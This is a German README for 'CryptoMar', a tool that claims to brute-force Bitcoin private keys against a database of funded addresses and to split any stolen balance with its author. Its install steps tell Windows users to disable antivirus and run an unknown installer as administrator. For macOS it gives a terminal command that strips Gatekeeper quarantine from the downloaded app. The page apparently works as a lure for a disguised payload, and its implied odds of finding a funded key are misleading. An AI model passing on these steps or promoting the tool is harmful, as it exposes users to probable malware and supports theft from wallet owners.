# CryptoMar

CryptoMar ist ein leistungsstarkes Tool zum Brute-Forcen von Bitcoin-Wallets, das auf einer benutzerdefinierten C++-Bibliothek basiert und für macOS und Windows optimiert ist. Das Programm unterstützt die schnelle Generierung und Suche nach privaten Schlüsseln und Bitcoin-Bech32-Adressen (P2WPKH) mit einer benutzerfreundlichen Oberfläche, die auf normale Benutzer ausgelegt ist.

## 🚀 Funktionen

* Blitzschnelle Bitcoin-Adressgenerierung mit einer nativen C++-Bibliothek.
* Unterstützung für Bitcoin-Adressen im Bech32-Format (P2WPKH).
* Multithread-Generierung und -Überprüfung mit minimalem Speicherverbrauch.
* Eine aktuelle Datenbank aller bestehenden P2WPKH-Adressen mit Guthaben (Stand: Mai 2025).

## 🔓 Funktionsweise

### 🗝️ Generierung von privaten und öffentlichen Schlüsseln

* Das Programm generiert zufällig eine 256-Bit-Zahl, die zum privaten Schlüssel wird.
* Ein öffentlicher Schlüssel wird mithilfe elliptischer Kurvenkryptografie (secp256k1) erzeugt.
* Der öffentliche Schlüssel wird zweimal gehasht (SHA-256 und RIPEMD-160), um eine Adresse im Bech32-Format zu erstellen.

### 🚀 So funktioniert das Wallet-Brute-Forcing

* Das Programm generiert Millionen privater Schlüssel und entsprechender Bech32-Adressen.
* Jede Adresse wird in einer Datenbank mit bekannten Adressen und bestätigten Guthaben überprüft.
* Wird eine Adresse mit Guthaben gefunden, wird der private Schlüssel gespeichert und der Benutzer benachrichtigt.

## 🌐 Wie viele Wallets haben Guthaben?

Am 20. Mai 2025 enthält die Datenbank des Programms **18.226.528** Bech32-Adressen (P2WPKH) mit bestätigten Guthaben über 0.00001 BTC.

## ❓ Warum teilt der Autor dieses Programm?

Das Brute-Forcen privater Schlüssel erfordert viel Zeit und Rechenleistung. Der Autor hat diese Software entwickelt, um den Prozess auf viele Nutzer zu verteilen. Der Benutzer, der den richtigen Schlüssel findet, erhält 90 % des Guthabens, der Autor 10 %.

## 📥 Download und Ausführung

### 🪟 Für Windows

1. Antivirus deaktivieren.
2. Neueste Version öffnen: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
3. Datei `CryptoMarInstaller.exe` herunterladen.
4. Installationsanweisungen befolgen.
5. Update (24.05.2025): Der Speicherverbrauch wurde optimiert. Zur schnellen Suche und effizienten Speichernutzung wird nun ein Bloom-Filter verwendet, kombiniert mit einer Saldenprüfung zur Vermeidung von Fehlalarmen. Um die Filterdatei zu erstellen, starten Sie das Programm als Administrator.

### 🍎 Für macOS

1. Neueste Version öffnen: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
2. Datei `CryptoMarAPP.zip` herunterladen.
3. Datei `CryptoMarAPP.zip` im Download-Ordner öffnen.
4. Terminal öffnen, folgenden Befehl eingeben und Enter drücken:
   ```bash
   xattr -rd com.apple.quarantine ~/Downloads/CryptoMar.app
   ```
5. Programm `CryptoMar.app` starten.

## ⚡ Kostenlose und kostenpflichtige Versionen

* **Kostenlose Version:** Begrenzte Geschwindigkeit und Laufzeit (bis zu 100 Stunden).
* **Kostenpflichtige Version:** Unbegrenzte Geschwindigkeit und Laufzeit.

Wenn das Programm beendet wird, ohne eine Datei zu finden, stelle sicher, dass alle Dateien im gleichen Ordner liegen.

## 💡 Support

Für Support kontaktiere den Entwickler oder erstelle ein Issue auf GitHub.  
Vor der Nutzung bitte die [Nutzungsbedingungen](https://github.com/HexaMar/CryptoMar_EN/blob/main/README.txt) lesen.
